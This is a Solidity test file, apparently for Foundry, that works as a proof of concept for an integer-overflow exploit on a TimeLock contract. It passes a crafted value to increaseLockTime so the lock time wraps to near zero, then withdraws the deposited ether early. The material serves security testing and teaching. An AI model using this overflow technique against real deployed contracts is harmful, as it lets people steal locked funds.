contract TimeLockExploitTest is Test {
    TimeLock public timeLock;

    function setUp() public {
        timeLock = new TimeLock();
        // Deposit 1 ether to have balance and lockTime set
        vm.deal(address(this), 1 ether);
        timeLock.deposit{value: 1 ether}();
    }

    function test_exploit_arithmetic() public {
        uint initialLockTime = timeLock.lockTime(address(this));

        // Calculate overflow value for uint256
        uint maxUint = type(uint256).max;

        // _secondsToIncrease = maxUint - initialLockTime + 1
        // This causes lockTime[address(this)] += _secondsToIncrease to overflow to zero
        uint overflowValue = maxUint - initialLockTime + 1;

        // Increase lock time with overflow value
        timeLock.increaseLockTime(overflowValue);

        uint newLockTime = timeLock.lockTime(address(this));

        // Assert that lockTime wrapped around and is now less than initialLockTime
        assertTrue(newLockTime < initialLockTime, "Lock time did not underflow");

        // Warp time to just after newLockTime (which wrapped to a small value)
        vm.warp(newLockTime + 1);

        // Withdraw should now succeed because block.timestamp > lockTime[address(this)]
        timeLock.withdraw();

        // Assert balance reset to zero
        uint finalBalance = timeLock.balances(address(this));
        assertEq(finalBalance, 0, "Balance not zero after withdrawal");

        // Assert contract's balance decreased by 1 ether
        // Since the test contract is the caller, check its ETH balance increased by 1 ether
        assertGt(address(this).balance, 0, "ETH not received after withdrawal");
    }
}

